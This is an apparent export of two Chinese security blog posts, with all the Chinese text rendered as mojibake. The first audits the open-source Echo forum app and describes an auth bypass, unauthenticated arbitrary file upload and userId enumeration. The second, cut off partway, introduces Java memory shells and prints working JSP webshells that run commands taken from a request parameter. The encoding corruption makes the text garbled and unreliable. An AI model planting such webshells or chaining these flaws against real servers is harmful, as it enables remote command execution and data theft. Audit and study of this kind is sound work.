é¡¹ç›®ä»‹ç»å¼€æºç¤¾åŒºç³»ç»Ÿï¼šåŸºäº SpringBoot + MyBatis + MySQL + Redis + Kafka + Elasticsearch + Spring Security + â€¦ å¹¶æä¾›è¯¦ç»†çš„å¼€å‘æ–‡æ¡£å’Œé…å¥—æ•™ç¨‹ã€‚åŒ…å«å¸–å­ã€è¯„è®ºã€ç§ä¿¡ã€ç³»ç»Ÿé€šçŸ¥ã€ç‚¹èµã€å…³æ³¨ã€æœç´¢ã€ç”¨æˆ·è®¾ç½®ã€æ•°æ®ç»Ÿè®¡ç­‰æ¨¡å—ã€‚3000+Starçš„é¡¹ç›®è¿˜æ˜¯æ¯”è¾ƒä¸é”™çš„ é¡¹ç›®åœ°å€ï¼šhttps://gitee.com/veal98/Echo ç¯å¢ƒæ­å»ºJDK 1.8.0_65Maven 3.9.9redis 3.0.504zookeeper 3.6.4kafka 2.12-3.5.1Elasticsearch 6.4.3 redisçš„å®‰è£…è¾ƒä¸ºç®€å•ï¼Œè¿™é‡Œå°±ä¸ä»‹ç»äº† å¯¹äºzookeeperå’Œkafkaæ¥è¯´ï¼Œä¸¤ä¸ªæ˜¯é…å¥—ä½¿ç”¨çš„ï¼Œå¹¶ä¸”kafkaå°±å·²ç»å†…ç½®äº†é€‚é…çš„zookeeperäº†ï¼Œä¸éœ€è¦æˆ‘ä»¬è‡ªå·±å†å»å•ç‹¬ä¸‹è½½å®‰è£…ï¼Œè¦ä¸ç„¶ä½ è¿˜è¦è€ƒè™‘ä¸¤ä¸ªç‰ˆæœ¬é€‚ä¸é€‚é…ï¼ˆåƒäº†å¤§äºã€‚ã€‚ã€‚ï¼‰ è¿™é‡Œç›´æ¥è´´é“¾æ¥ï¼šhttps://www.cnblogs.com/Marydon20170307/p/17933358.html å¯¹äºElasticsearchçš„å®‰è£…å¯å‚è€ƒï¼šhttps://zhuanlan.zhihu.com/p/451571598 ä½†æ˜¯æœ‰ç‚¹ä¸åŒçš„æ˜¯ï¼Œå¯¹äºæˆ‘è‡ªå·±æ¥è¯´ï¼Œæˆ‘åœ¨conf\\elasticsearch.ymlæ–‡ä»¶ä¸­è¿˜è¦å¤šæ·»åŠ ä¸€ç‚¹ï¼Œå¦‚ä¸‹ï¼š http.cors.enabled: truehttp.cors.allow-origin: *network.host: 127.0.0.1xpack.ml.enabled: false å¦‚ä¸Šé…ç½®ä¹‹åå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼Œå°±æ˜¯å¤šå…³é—­äº†æœºå™¨å­¦ä¹ çš„åŠŸèƒ½ æ³¨ï¼šå¯åŠ¨é¡¹ç›®ä¹‹å‰ä¸Šé¢è¿™äº›åŸºç¡€é…ç½®éƒ½è¦å¼€å¯æ¥ æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å…ˆæŠŠè¯¥é¡¹ç›®çš„æºç ä¸‹ä¸‹æ¥ï¼Œç„¶åå¯¹srcmainresourcesapplication-develop.propertiesæ–‡ä»¶è¿›è¡Œä¸€éƒ¨åˆ†çš„ä¿®æ”¹ spring.datasource.url = jdbc:mysql://127.0.0.1:3306/æ•°æ®åº“å?characterEncoding=utf-8useSSL=falseserverTimezone=Hongkongspring.datasource.username = è‡ªå·±çš„è´¦å·åspring.datasource.password = è‡ªå·±çš„å¯†ç ......# Elasticsearchspring.data.elasticsearch.cluster-name = è¯¥å­—æ®µè§ Elasticsearch å®‰è£…åŒ…ä¸­çš„ elasticsearch.ymlçš„cluster-namespring.data.elasticsearch.cluster-nodes = 127.0.0.1:9300 å…¶ä»–é…ç½®è¦æ˜¯ä½ çš„redisé‚£äº›é…ç½®éƒ½ä¿æŒé»˜è®¤çš„è¯é‚£ä¹ˆä¹Ÿä¸éœ€è¦è¿›è¡Œæ›´æ”¹ ç„¶åæˆ‘ä»¬è¿˜éœ€è¦åˆ›å»ºæ•°æ®åº“å¹¶å°†æä¾›çš„sqlæ–‡ä»¶å…¨éƒ¨å¯¼å…¥è¿›å»ï¼Œæœ€åå¯¼å…¥å®Œåçš„ç»“æœå¦‚ä¸‹ï¼š æœ€åå°±æ˜¯å¯åŠ¨springbootï¼Œè®¿é—®æˆ‘ä»¬è®¾å®šçš„å¯¹åº”ç«¯å£ å®¡è®¡ç”±äºç¬¬ä¸€æ¬¡å®¡è®¡javaé¡¹ç›®æœ¨æœ‰ç»éªŒï¼Œå†åŠ ä¸Šè¿™æ˜¯ä¸ªå°é¡¹ç›®ï¼Œä»£ç é‡ä¹Ÿä¸èƒ½ç®—å¾ˆå¤šï¼Œæ‰€ä»¥æˆ‘æ˜¯å…¨éƒ¨çš„æ–‡ä»¶éƒ½çœ‹äº†ä¸€é é¦–å…ˆè¯¥é¡¹ç›®é‡Œé¢æ˜¯ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ï¼Œè¿™æ˜¯å› ä¸ºæ‰€æœ‰çš„è¾“å…¥ç‚¹éƒ½è¿›è¡Œäº†é¢„ç¼–è¯‘å¤„ç†ï¼Œéƒ½ç”¨#è¿›è¡Œäº†å¤„ç† ç¢°å£1æ— å¦¨ï¼Œç»§ç»­å®¡è®¡ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹ï¼Œä½äºUserController.javaæ–‡ä»¶ä¸­ /** * æ›´æ–°å›¾åƒè·¯å¾„ï¼ˆå°†æœ¬åœ°çš„å›¾åƒè·¯å¾„æ›´æ–°ä¸ºäº‘æœåŠ¡å™¨ä¸Šçš„å›¾åƒè·¯å¾„ï¼‰ * @param fileName * @return */@PostMapping(/header/url)@ResponseBodypublic String updateHeaderUrl(String fileName) if (StringUtils.isBlank(fileName)) return CommunityUtil.getJSONString(1, æ–‡ä»¶åä¸èƒ½ä¸ºç©º); // æ–‡ä»¶åœ¨äº‘æœåŠ¡å™¨ä¸Šçš„çš„è®¿é—®è·¯å¾„ String url = headerBucketUrl + / + fileName; userService.updateHeader(hostHolder.getUser().getId(), url); return CommunityUtil.getJSONString(0); æ–¹æ³•æ˜¯ç›´æ¥è¯»å–äº†äº‘æœåŠ¡å™¨ä¸Šé¢çš„å›¾åƒæ–‡ä»¶å½“ä½œäº†å¤´åƒï¼Œè™½ç„¶è¯´å¯¹æœ€åçš„æ–‡ä»¶è·¯å¾„è¿›è¡Œäº†å¤„ç†ï¼Œæ— æ³•æ§åˆ¶ è¿™æ—¶æˆ‘å°±æƒ³ç€ä¸Šä¼ å›¾ç‰‡çš„æ–¹æ³•æœ‰æ²¡æœ‰è®¾ç½®æ£€éªŒå›¾ç‰‡å†…å®¹å•¥çš„ï¼Œè¯¥æ–¹æ³•å¦‚ä¸‹ï¼š @GetMapping(/setting)public String getSettingPage(Model model) // ç”Ÿæˆä¸Šä¼ æ–‡ä»¶çš„åç§° String fileName = CommunityUtil.generateUUID(); model.addAttribute(fileName, fileName); // è®¾ç½®å“åº”ä¿¡æ¯(qiniu çš„è§„å®šå†™æ³•) StringMap policy = new StringMap(); policy.put(returnBody, CommunityUtil.getJSONString(0)); // ç”Ÿæˆä¸Šä¼ åˆ° qiniu çš„å‡­è¯(qiniu çš„è§„å®šå†™æ³•) Auth auth = Auth.create(accessKey, secretKey); String uploadToken = auth.uploadToken(headerBucketName, fileName, 3600, policy); model.addAttribute(uploadToken, uploadToken); return /site/setting; æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä»»ä½•æ£€éªŒï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘å°è¯•ä¸Šä¼ ä¸€ä¸ªxssæ–‡ä»¶ï¼Œä½†å¾ˆé—æ†¾çš„æ˜¯æ— æ³•è§¦å‘ï¼ŒæŸ¥äº†ä¸€ä¸‹æ‰å‘ç°è¯¥é“¾æ¥æ˜¯é€šè¿‡imgæ ‡ç­¾è¿›è¡Œçš„åŠ è½½ï¼Œæµè§ˆå™¨ä¼šå°† HTML æ–‡ä»¶å½“ä½œå›¾ç‰‡è§£æï¼ˆæ˜¾ç¤ºç ´æŸå›¾æ ‡ï¼‰ï¼Œæ‰€ä»¥æ— æ³•è§¦å‘æˆåŠŸï¼ˆå¿˜äº†è¿™èŒ¬ã€‚ã€‚ã€‚ï¼‰ ç»•è¿‡é‰´æƒç»§ç»­å®¡è®¡ï¼Œåœ¨LoginTicketInterceptor.javaä¸­æœ‰ä¸€ä¸ªpreHandleæ–¹æ³•å­˜åœ¨æ¼æ´ @Overridepublic boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception // ä» cookie ä¸­è·å–å‡­è¯ String ticket = CookieUtil.getValue(request, ticket); if (ticket != null) // æŸ¥è¯¢å‡­è¯ LoginTicket loginTicket = userService.findLoginTicket(ticket); // æ£€æŸ¥å‡­è¯çŠ¶æ€ï¼ˆæ˜¯å¦æœ‰æ•ˆï¼‰ä»¥åŠæ˜¯å¦è¿‡æœŸ if (loginTicket != null loginTicket.getStatus() == 0 loginTicket.getExpired().after(new Date())) // æ ¹æ®å‡­è¯æŸ¥è¯¢ç”¨æˆ· User user = userService.findUserById(loginTicket.getUserId()); // åœ¨æœ¬æ¬¡è¯·æ±‚ä¸­æŒæœ‰ç”¨æˆ·ä¿¡æ¯ hostHolder.setUser(user); // æ„å»ºç”¨æˆ·è®¤è¯çš„ç»“æœï¼Œå¹¶å­˜å…¥ SecurityContext, ä»¥ä¾¿äº Spring Security è¿›è¡Œæˆæƒ Authentication authentication = new UsernamePasswordAuthenticationToken( user, user.getPassword(), userService.getAuthorities(user.getId()) ); SecurityContextHolder.setContext(new SecurityContextImpl(authentication)); return true; å¯¹äºspringæ¡†æ¶ç†Ÿæ‚‰éƒ½çŸ¥é“ï¼Œè¯¥ç±»å®ç°äº†HandlerInterceptoræ¥å£ï¼Œå…¶preHandleæ–¹æ³•åœ¨æ¯ä¸€æ¬¡è¯·æ±‚çš„è¿‡ç¨‹ä¸­éƒ½ä¼šæ‰§è¡Œä¸€é HttpRequest -- Filter -- DispactherServlet -- Interceptor -- Controller è€Œè¯¥æ–¹æ³•åªå¯¹ticketæœ‰å€¼çš„æ—¶å€™è¿›è¡Œé‰´æƒï¼Œå¯¹äºticketå€¼ä¸ºnullçš„æ—¶å€™æ²¡æœ‰è¿›è¡Œä»»ä½•å¤„ç†ï¼Œç›´æ¥è¿”å›trueï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾¿å¯ä»¥è½»æ¾ç»•è¿‡é‰´æƒäº†ï¼Œå…·ä½“å¦‚ä½•ä½¿ç”¨ä¼šé…åˆä¸‹é¢çš„æ¼æ´è¿›è¡Œ æœªæˆæƒä¸Šä¼ ä»»æ„æ–‡ä»¶ä½äºDiscussPostController.javaæ–‡ä»¶ä¸­çš„uploadMdPicæ–¹æ³• è¿™æ˜¯ä¸€ä¸ªé€šè¿‡postæ–¹æ³•è®¿é—®çš„æ¥å£ï¼Œæ³¨é‡Šè¯´çš„æ˜¯æ‹¿æ¥ä¸Šä¼ å›¾ç‰‡ç”¨çš„ï¼Œä½†æ˜¯çœ‹å…·ä½“ä»£ç å®ç°æˆ‘ä»¬å‘ç°è¿˜æ˜¯æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ï¼Œåç¼€åè¿›è¡Œä»»ä½•çš„æ£€éªŒï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå½“ç„¶è¿™åŠŸèƒ½æ˜¯å¾—åœ¨ç™»å½•åæ‰èƒ½ä½¿ç”¨çš„ï¼Œä½†æˆ‘ä»¬å‰é¢ä¸æ˜¯å‘ç°äº†ä¸€ä¸ªé‰´æƒç»•è¿‡å˜›ï¼Œå¯ä»¥ç›´æ¥æ‰“é…åˆå®ç°æœªæˆæƒä»»æ„æ–‡ä»¶ä¸Šä¼  è®©aiå¸®å¿™ç”Ÿæˆä¸€ä¸ªhtmlè¡¨å•ä¸Šä¼ æ–‡ä»¶çš„æŠ¥æ–‡ï¼Œç„¶åè¿›è¡Œåˆ©ç”¨ ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®è¯¥é“¾æ¥å´æŠ¥äº†404ï¼Œæ‰“å¼€hackbaræŸ¥äº†ä¸€ä¸‹é—®é¢˜å¦‚ä¸‹ï¼š å°†è¯¥æŠ¥é”™æ‹¿å»é—®äº†aiï¼ŒæŒ‰å…¶æä¾›çš„æ–¹æ³•è¿›è¡Œå°è¯•ä¾æ—§æ— æœï¼Œä¸çŸ¥é“æ˜¯å“ªé‡Œé…ç½®å‡ºçš„é—®é¢˜ï¼Œä½†æ–‡ä»¶æ˜¯ç¡®ç¡®å®å®ä¸Šä¼ æˆåŠŸäº† æˆ‘ä»¬é€šè¿‡application-develop.propertiesä¸­çš„é…ç½®å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨ä½ç½® ç›´æ¥ç‚¹è¯¥æ–‡ä»¶ï¼Œç¡®è®¤äº†æ–‡ä»¶æ˜¯æ²¡æœ‰é—®é¢˜çš„ é‚£å°±å¾ˆå¥‡æ€ªäº†ã€‚ã€‚ã€‚ æœªæˆæƒå„ç§éå†UserController.javaæ–‡ä»¶ä¸­æœ‰å¥½å‡ ä¸ªæ–¹æ³•å­˜åœ¨å¯ä»¥è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·çš„æ¼æ´ï¼Œç¬¬ä¸€ä¸ªæ˜¯getProfilePageæ–¹æ³• è¯¥å‡½æ•°çš„å†…å®¹ä¸é‡è¦ï¼Œé‡ç‚¹æ˜¯çœ‹ä¸Šé¢çš„é“¾æ¥ä»£ç @GetMapping(/profile/userId)ï¼Œæ˜¯æ ¹æ®userIdçš„å€¼æ¥å†³å®šè¦è®¿é—®çš„æ˜¯å“ªä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯ä¾ç„¶éœ€è¦æˆ‘ä»¬ç»•è¿‡é‰´æƒï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å¯¹è¯¥userIdçš„å€¼è¿›è¡Œçˆ†ç ´ï¼Œè·å–å¤§é‡ä¿¡æ¯ æ¥ä¸€ä¸ªä¾‹å­å¦‚ä¸‹ï¼š ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯getMyDiscussPostsæ–¹æ³• ä¾æ—§æ˜¯é€šè¿‡userIdæ¥è®¿é—®æ¯ä¸ªäººå‘å¸ƒçš„å¸–å­ï¼Œè¿›è¡Œåˆ©ç”¨å¦‚ä¸‹ï¼š æœ€åä¸€ä¸ªæ–¹æ³•æ˜¯getMyCommentsæ–¹æ³• è¿˜æ˜¯é€šè¿‡userIdæ¥è®¿é—®æ¯ä¸ªäººè‡ªå·±çš„è¯„è®ºå›å¤ï¼Œè¿›è¡Œåˆ©ç”¨å¦‚ä¸‹ï¼š ç¢°å£2æ˜¯ä½äºDiscussPostController.javaæ–‡ä»¶ä¸­çš„setDeleteæ–¹æ³• @PostMapping(/delete)@ResponseBodypublic String setDelete(int id) discussPostService.updateStatus(id, 2); // è§¦å‘åˆ å¸–äº‹ä»¶ï¼Œé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—æ›´æ–° Elasticsearch æœåŠ¡å™¨ Event event = new Event() .setTopic(TOPIC_DELETE) .setUserId(hostHolder.getUser().getId()) .setEntityType(ENTITY_TYPE_POST) .setEntityId(id); eventProducer.fireEvent(event); return CommunityUtil.getJSONString(0); çœ‹ç€ä¼¼ä¹æ˜¯ç›´æ¥postä¼ å‚idçš„å€¼ç„¶åä¾¿å¯ä»¥è¿›è¡Œä¸€ä¸ªåˆ é™¤å¸–å­çš„æ“ä½œï¼Œå°è¯•ä¸€æ‰‹ ç»“æœæ˜¯ç›´æ¥è·³è½¬åˆ°äº†deniedé¡µé¢ï¼Œå“¦å¼ï¼Ÿè¿›åˆ°å…·ä½“çš„å¸–å­é‡Œé¢è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°æ²¡æœ‰çœ‹åˆ°æœ‰åˆ å¸–è¿™ä¸ªæŒ‰é’® æ„Ÿè§‰è¿™ä¸ªæ“ä½œæ˜¯ç®¡ç†å‘˜æ‰èƒ½åšçš„ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹admin æœç„¶æ˜¯æœ‰ä¸åŒæƒé™çš„ï¼ŒæŸ¥çœ‹å…¶ç”¨æ³• åœ¨SecurityConfig.javaæ–‡ä»¶ä¸­çš„configureæ–¹æ³•ä¸­å®šä¹‰äº†æ¯ä¸ªä¸åŒçš„æƒé™å¯ä»¥è®¿é—®çš„è·¯ç”±ï¼Œè€Œä¸Šé¢çš„åˆ å¸–è·¯ç”±ä¾¿è¦æ±‚å¿…é¡»æ˜¯adminæ‰å¯ä»¥ å†æŸ¥ä¸€ä¸‹æƒé™æ˜¯åœ¨å“ªé‡Œç¡®å®šçš„ï¼Œä½äºUserService.javaæ–‡ä»¶ä¸­çš„getAuthoritiesæ–¹æ³• ç»§ç»­æŸ¥çœ‹è¯¥æ–¹æ³•çš„è°ƒç”¨ ç†Ÿæ‚‰å§ï¼Œæˆ‘ä»¬ç»•è¿‡é‰´æƒçš„æ–¹æ³•å°±æ³¨å®šäº†æˆ‘ä»¬è¿æ™®é€šç”¨æˆ·çš„æƒé™éƒ½æ²¡æœ‰ é‚£ä¸ºä»€ä¹ˆä¸Šé¢çš„æ¼æ´æˆ‘ä»¬å¯ä»¥ç›´æ¥é…åˆç»•è¿‡é‰´æƒæ¥åˆ©ç”¨å‘¢ï¼Œè¿™æ˜¯å› ä¸ºåœ¨SecurityConfig.javaæ–‡ä»¶ä¸­çš„configureæ–¹æ³•ä¸­å®šä¹‰çš„æ‰€æœ‰éœ€è¦æƒé™çš„è·¯ç”±ä¸Šé¢é‚£å‡ ä¸ªæ­£å¥½éƒ½ä¸åŒ…æ‹¬åœ¨å…¶ä¸­ï¼Œåˆæ˜¯ä¸€ä¸ªäººå·¥å¤±è¯¯çš„åœ°æ–¹ æ€»ç»“ç¬¬ä¸€æ¬¡è¿›è¡Œjavaä»£ç å®¡è®¡ï¼Œé‡‡ç”¨äº†æœ€ç¬¨çš„æ–¹æ³•ï¼ŒæŠŠå…¨éƒ¨ä»£ç éƒ½çœ‹äº†ä¸€éï¼Œè™½ç„¶è€—çš„æ—¶é—´é•¿äº†äº›ï¼Œä½†æ˜¯ä»ç»“æœæ¥çœ‹è¿˜æ˜¯å€¼å¾—çš„ å½“ç„¶ä¹Ÿæœ‰äº†ä¸€äº›æ€è·¯äº†ï¼Œé‡ç‚¹å…³æ³¨controllerç›®å½•ä¸‹é¢çš„ä»£ç ï¼Œå½“ç„¶è¿˜æœ‰interceptorç›®å½•ä¸‹é¢çš„ï¼Œæ¯•ç«Ÿè¯¥ç›®å½•ä¸‹é¢çš„æ–‡ä»¶ä½œç”¨ä¸»è¦ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚å¹¶åšç›¸åº”çš„å¤„ç†ï¼Œé€šå¸¸åº”ç”¨åœ¨æƒé™éªŒè¯ã€è®°å½•è¯·æ±‚ä¿¡æ¯çš„æ—¥å¿—ã€åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ç­‰åŠŸèƒ½ä¸Šï¼Œå¯èƒ½å­˜åœ¨ç»•è¿‡é‰´æƒç­‰æ¼æ´ å‚è€ƒJAVAä»£ç å®¡è®¡â€”â€”Echo4.2","categories":["ä»£ç å®¡è®¡"]},{"title":"javaå†…å­˜é©¬å­¦ä¹ ","path":"/2025/05/06/javaå†…å­˜é©¬å­¦ä¹ /","content":"åŸºç¡€çŸ¥è¯†Javaå†…å­˜é©¬ç³»åˆ—-01-åŸºç¡€å†…å®¹å­¦ä¹  JSPåœ¨æ­£å¼å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹jsp JSPç¯å¢ƒæ­å»ºæ ¹æ®ç½‘ä¸Šä¸€ä½å¸ˆå‚…çš„æ–‡ç« è¿›è¡Œæ­å»ºçš„ï¼šServlet é¡¹ç›®æ­å»º JSPçš„è¯­æ³•è„šæœ¬ç¨‹åºè„šæœ¬ç¨‹åºå¯ä»¥åŒ…å«ä»»æ„é‡çš„Javaè¯­å¥ã€å˜é‡ã€æ–¹æ³•æˆ–è¡¨è¾¾å¼ï¼Œåªè¦å®ƒä»¬åœ¨è„šæœ¬è¯­è¨€ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚è„šæœ¬ç¨‹åºçš„æ ¼å¼å¦‚ä¸‹ % ä»£ç ç‰‡æ®µ % å…¶ç­‰ä»·äºä¸‹é¢çš„XMLè¯­å¥ jsp:scriptlet ä»£ç ç‰‡æ®µ/jsp:scriptlet ä¸‹é¢æ˜¯ä½¿ç”¨ç¤ºä¾‹ %@ page contentType=text/html; charset=UTF-8 pageEncoding=UTF-8 %!DOCTYPE htmlhtmlhead titleJSP - Hello World/title/headbodyh1%= Hello World! %/h1br/h2Hello World!!!/h2% out.println(GoodBye!); %/body/html JSPå£°æ˜ä¸€ä¸ªå£°æ˜è¯­å¥å¯ä»¥å£°æ˜ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ã€æ–¹æ³•ï¼Œä¾›åé¢çš„Javaä»£ç ä½¿ç”¨ã€‚JSPå£°æ˜è¯­å¥æ ¼å¼å¦‚ä¸‹ %! å£°æ˜ % åŒæ ·ç­‰ä»·äºä¸‹é¢çš„XMLè¯­å¥ jsp:declaration ä»£ç ç‰‡æ®µ/jsp:declaration ä¸‹é¢æ˜¯ä½¿ç”¨ç¤ºä¾‹ htmlbodyh2Hello World!!!/h2%! String s= GoodBye!; %% out.println(s); %/body/html JSPè¡¨è¾¾å¼å¦‚æœJSPè¡¨è¾¾å¼ä¸­ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šè‡ªåŠ¨è°ƒç”¨å…¶toString()æ–¹æ³•ã€‚æ ¼å¼å¦‚ä¸‹ï¼Œæ³¨æ„è¡¨è¾¾å¼åæ²¡æœ‰; %= è¡¨è¾¾å¼ % ç­‰ä»·äºä¸‹é¢çš„XMLè¡¨è¾¾å¼ jsp:expression è¡¨è¾¾å¼/jsp:expression ä¸‹é¢æ˜¯ä½¿ç”¨ç¤ºä¾‹ htmlbodyh2Hello World!!!/h2p% String name = Sherlock; %username:%=name%/p/body/html JSPæŒ‡ä»¤JSPæŒ‡ä»¤ç”¨æ¥è®¾ç½®ä¸æ•´ä¸ªJSPé¡µé¢ç›¸å…³çš„å±æ€§ã€‚ä¸‹é¢æœ‰ä¸‰ç§JSPæŒ‡ä»¤ æŒ‡ä»¤ æè¿° %@ page â€¦ % å®šä¹‰é¡µé¢çš„ä¾èµ–å±æ€§ï¼Œæ¯”å¦‚è„šæœ¬è¯­è¨€ã€erroré¡µé¢ã€ç¼“å­˜éœ€æ±‚ç­‰ç­‰ %@ include â€¦ % åŒ…å«å…¶ä»–æ–‡ä»¶ %@ taglib â€¦ % å¼•å…¥æ ‡ç­¾åº“çš„å®šä¹‰ï¼Œå¯ä»¥æ˜¯è‡ªå®šä¹‰æ ‡ç­¾ æ¯”å¦‚æˆ‘ä»¬èƒ½é€šè¿‡pageæŒ‡ä»¤æ¥è®¾ç½®jspé¡µé¢çš„ç¼–ç æ ¼å¼ï¼š%@ page language=java contentType=text/html; charset=UTF-8 pageEncoding=UTF-8% %@ page language=java contentType=text/html; charset=UTF-8 pageEncoding=UTF-8%htmlbodyh2Hello World!!!/h2p% String name = æ«; %ç”¨æˆ·åï¼š%=name%/p/body/html JSPæ³¨é‡Šæ ¼å¼å¦‚ä¸‹ %-- æ³¨é‡Šå†…å®¹ --% JSPå†…ç½®å¯¹è±¡JSPæœ‰ä¹å¤§å†…ç½®å¯¹è±¡ï¼Œä»–ä»¬èƒ½å¤Ÿåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯äº¤äº’çš„è¿‡ç¨‹ä¸­åˆ†åˆ«å®Œæˆä¸åŒçš„åŠŸèƒ½ã€‚å…¶ç‰¹ç‚¹å¦‚ä¸‹ ç”± JSP è§„èŒƒæä¾›ï¼Œä¸ç”¨ç¼–å†™è€…å®ä¾‹åŒ– é€šè¿‡ Web å®¹å™¨å®ç°å’Œç®¡ç† æ‰€æœ‰ JSP é¡µé¢å‡å¯ä½¿ç”¨ åªæœ‰åœ¨è„šæœ¬å…ƒç´ çš„è¡¨è¾¾å¼æˆ–ä»£ç æ®µä¸­æ‰èƒ½ä½¿ç”¨ å¯¹è±¡ ç±»å‹ æè¿° request javax.servlet.http.HttpServletRequest è·å–ç”¨æˆ·è¯·æ±‚ä¿¡æ¯ response javax.servlet.http.HttpServletResponse å“åº”å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å°†å¤„ç†ä¿¡æ¯è¿”å›åˆ°å®¢æˆ·ç«¯ response javax.servlet.jsp.JspWriter è¾“å‡ºå†…å®¹åˆ° HTML ä¸­ session javax.servlet.http.HttpSession ç”¨æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯ application javax.servlet.ServletContext æ‰€æœ‰ç”¨æˆ·å…±äº«ä¿¡æ¯ config javax.servlet.ServletConfig è¿™æ˜¯ä¸€ä¸ª Servlet é…ç½®å¯¹è±¡ï¼Œç”¨äº Servlet å’Œé¡µé¢çš„åˆå§‹åŒ–å‚æ•° pageContext javax.servlet.jsp.PageContext JSP çš„é¡µé¢å®¹å™¨ï¼Œç”¨äºè®¿é—® pageã€requestã€application å’Œ session çš„å±æ€§ page javax.servlet.jsp.HttpJspPage ç±»ä¼¼äº Java ç±»çš„ this å…³é”®å­—ï¼Œè¡¨ç¤ºå½“å‰ JSP é¡µé¢ exception java.lang.Throwable è¯¥å¯¹è±¡ç”¨äºå¤„ç† JSP æ–‡ä»¶æ‰§è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯å’Œå¼‚å¸¸ï¼›åªæœ‰åœ¨ JSP é¡µé¢çš„ page æŒ‡ä»¤ä¸­æŒ‡å®š isErrorPage çš„å–å€¼ true æ—¶ï¼Œæ‰å¯ä»¥åœ¨æœ¬é¡µé¢ä½¿ç”¨ exception å¯¹è±¡ JSPæœ¨é©¬æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ä¼ ç»Ÿçš„JSPæœ¨é©¬æ˜¯å¦‚ä½•å®ç°çš„ % Runtime.getRuntime().exec(request.getParameter(cmd));% ä¸Šé¢æ˜¯æœ€ç®€å•çš„ä¸€å¥è¯æœ¨é©¬ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œé€‚åˆç”¨æ¥åå¼¹shellã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¸¦å›æ˜¾çš„JSPæœ¨é©¬ %@ page contentType=text/html;charset=UTF-8 language=java %% if(request.getParameter(cmd)!=null) java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(cmd)).getInputStream(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in)); String line; PrintWriter printWriter = response.getWriter(); printWriter.write(pre); while ((line = bufferedReader.readLine()) != null) printWriter.println(line); printWriter.write(/pre); % ä¼ ç»Ÿçš„JSPæœ¨é©¬ç‰¹å¾æ€§å¼ºï¼Œä¸”éœ€è¦æ–‡ä»¶è½åœ°ï¼Œå®¹æ˜“è¢«æŸ¥æ€ã€‚å› æ­¤ç°åœ¨å‡ºç°äº†å†…å­˜é©¬æŠ€æœ¯ã€‚Javaå†…å­˜é©¬åˆç§°â€æ— æ–‡ä»¶é©¬â€ï¼Œç›¸è¾ƒäºä¼ ç»Ÿçš„JSPæœ¨é©¬ï¼Œå…¶æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯æ— æ–‡ä»¶è½åœ°ï¼Œå­˜åœ¨äºå†…å­˜ä¹‹ä¸­ï¼Œéšè”½æ€§å¼ºã€‚ Javaå†…å­˜é©¬æŒ‰ç…§å®ç°åŸç†å¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§ åˆ©ç”¨Java Webç»„ä»¶ï¼šåŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶ï¼Œå¦‚Servletã€Filterã€Listenerç­‰ã€‚åœ¨Springæ¡†æ¶ä¸‹å°±æ˜¯Controllerã€Intercepterã€‚ ä¿®æ”¹å­—èŠ‚ç ï¼šåˆ©ç”¨Javaçš„Instrumentæœºåˆ¶ï¼ŒåŠ¨æ€æ³¨å…¥Agentï¼Œåœ¨Javaå†…å­˜ä¸­åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç ï¼Œåœ¨HTTPè¯·æ±‚æ‰§è¡Œè·¯å¾„ä¸­çš„ç±»ä¸­æ·»åŠ æ¶æ„ä»£ç ï¼Œå¯ä»¥å®ç°æ ¹æ®è¯·æ±‚çš„å‚æ•°æ‰§è¡Œä»»æ„ä»£ç ã€‚ Tomcat ä¸­çš„ä¸‰ä¸ª Context çš„ç†è§£Contextcontextæ˜¯ä¸Šä¸‹æ–‡çš„æ„æ€ï¼Œåœ¨javaä¸­ç»å¸¸èƒ½çœ‹åˆ°è¿™ä¸ªä¸œè¥¿ã€‚é‚£ä¹ˆåˆ°åº•æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ æ 